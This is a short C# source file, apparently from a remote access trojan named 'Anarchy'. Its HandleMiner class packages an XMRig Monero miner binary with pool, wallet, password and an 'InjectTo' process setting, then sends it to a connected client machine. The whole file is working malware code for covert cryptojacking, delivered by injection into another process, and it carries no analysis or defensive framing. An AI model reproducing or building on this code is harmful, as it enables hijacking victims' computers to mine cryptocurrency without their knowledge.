using System.IO;
using System.Threading;
using Anarchy.Helpers;
using Anarchy.Helpers.Algorithm;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleMiner
    {
        public void SendMiner(Clients client)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "xmr";
            msgPack.ForcePathObject("Command").AsString = "save";
            msgPack.ForcePathObject("Bin").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\xmrig.bin")));
            msgPack.ForcePathObject("Hash").AsString = GetHash.GetChecksum("Plugins\\xmrig.bin");
            msgPack.ForcePathObject("Pool").AsString = Settings.XmrSettings.Pool;
            msgPack.ForcePathObject("Wallet").AsString = Settings.XmrSettings.Wallet;
            msgPack.ForcePathObject("Pass").AsString = Settings.XmrSettings.Pass;
            msgPack.ForcePathObject("InjectTo").AsString = Settings.XmrSettings.InjectTo;
            ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
        }
    }
}
